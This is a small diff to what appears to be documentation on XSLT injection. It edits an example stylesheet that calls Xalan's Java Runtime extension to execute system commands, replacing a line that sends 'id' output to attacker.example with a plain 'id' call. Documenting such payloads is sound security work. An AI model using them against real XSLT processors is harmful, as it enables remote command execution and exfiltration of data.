@@ -30,7 +30,7 @@ Both elements must appear as top-level children of `xsl:stylesheet`. Injected th
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
     xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
   <xsl:template match="/">
-    <xsl:value-of select="rt:exec(rt:getRuntime(), 'curl http://attacker.example/$(id)')"/>
+    <xsl:value-of select="rt:exec(rt:getRuntime(), 'id')"/>
   </xsl:template>
 </xsl:stylesheet>
 ```
